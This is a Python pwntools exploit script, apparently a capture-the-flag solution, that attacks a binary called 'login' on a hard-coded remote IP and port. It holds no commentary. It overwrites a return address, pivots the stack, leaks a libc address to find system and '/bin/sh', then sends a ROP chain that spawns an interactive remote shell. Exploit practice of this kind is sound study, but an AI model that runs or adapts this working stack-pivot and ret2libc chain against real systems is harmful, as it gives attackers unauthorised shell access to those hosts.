# -*- coding: utf-8 -*
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
elf = ELF('login')
libc = ELF("libc.so.6")
p = 0
def pwn(ip,port,debug):
	global p
	if(debug == 1):
		p = process('./login')

	else:
		p = remote(ip,port)

	#ROPgadget --binary login --only "pop|ret"
	'''
	0x0000000000401aac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
	0x0000000000401aae : pop r13 ; pop r14 ; pop r15 ; ret
	0x0000000000401ab0 : pop r14 ; pop r15 ; ret
	0x0000000000401ab2 : pop r15 ; ret
	0x0000000000401aab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
	0x0000000000401aaf : pop rbp ; pop r14 ; pop r15 ; ret
	0x0000000000400760 : pop rbp ; ret
	0x0000000000401ab3 : pop rdi ; ret
	0x0000000000401ab1 : pop rsi ; pop r15 ; ret
	0x0000000000401aad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
	0x0000000000400641 : ret
	'''

	pop_rdi_ret = 0x401ab3

	ret_addr = 0x401876 
	Name_addr = 0x602400

	payload = "admin".ljust(8,"\x00")
	payload += p64(ret_addr)
	p.sendafter(">",payload)
	payload2 = "admin".ljust(0x20,"\x00")
	payload2 += p64(Name_addr) #stack transfer
	p.sendafter(">",payload2)
	p.recvuntil("\x2f\x5c\x20\x7c\x20\x7c\x20\x7c\x20\x7c\x20\x20\x20")
	#-------link libcaddr
	libcbase_addr = u64(p.recv(6).ljust(8,'\x00'))-(0x7f11360e8c0f-0x7f1136070000)
	print "libcbase_addr = ",hex(libcbase_addr)
	system_addr = libcbase_addr + libc.symbols["system"]
	binsh_addr = libcbase_addr + libc.search("/bin/sh\x00").next()
	print "system_addr = ",hex(system_addr)
	payload3 = "admin".ljust(8,"\x00")
	payload3 += p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)
	p.sendafter(">",payload3)	
	payload4 = "admin".ljust(0x20,"\x00")
	payload4 += p64(Name_addr)
	p.sendafter(">",payload4)
	p.interactive()
if __name__ == '__main__':
	pwn('82.156.58.12',9000,0)



